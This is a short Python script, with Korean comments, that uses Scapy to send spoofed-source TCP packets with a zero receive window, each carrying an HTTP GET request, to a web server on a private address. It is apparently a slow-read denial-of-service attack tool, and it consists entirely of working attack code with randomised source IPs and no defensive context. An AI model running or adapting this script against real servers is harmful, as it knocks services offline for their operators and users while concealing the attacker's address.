from scapy.all import *
import string
import random

def Slowread():
    dst_ip = "192.168.27.128"
    src_ip=RandIP()
    s_port = RandNum(1024,65535)
    dst_port = 80
    count = 30
    headers = [
        "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Accept-language: en-US,en"
    ]
    data = (random.choice(string.ascii_letters + string.digits)) * 1000  # 데이터
    for x in range(0, count):
        i = IP(src=src_ip, dst=dst_ip)  # 출발지 주소는 Random으로 설정하였습니다.
        t = TCP(sport=s_port, dport=dst_port, window=0)
        packet = "GET / HTTP/1.1\r\n" + \
                 "Host: {}\r\n".format(dst_ip) + \
                 "Connection: keep-alive\r\n" + \
                 "Cache-Control: max-age=0\r\n" + \
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" + \
                 "Upgrade-Insecure-Requests: 1\r\n" + \
                 "{0}\r\n{1}\r\n".format(headers[0], headers[1]) + \
                 "Accept-Encoding: gzip, deflate, sdch\r\n" + \
                 "Connection: Keep-Alive\r\n"
        send(i / t / packet / data)
        print("패킷 전송량 : ",x)
Slowread()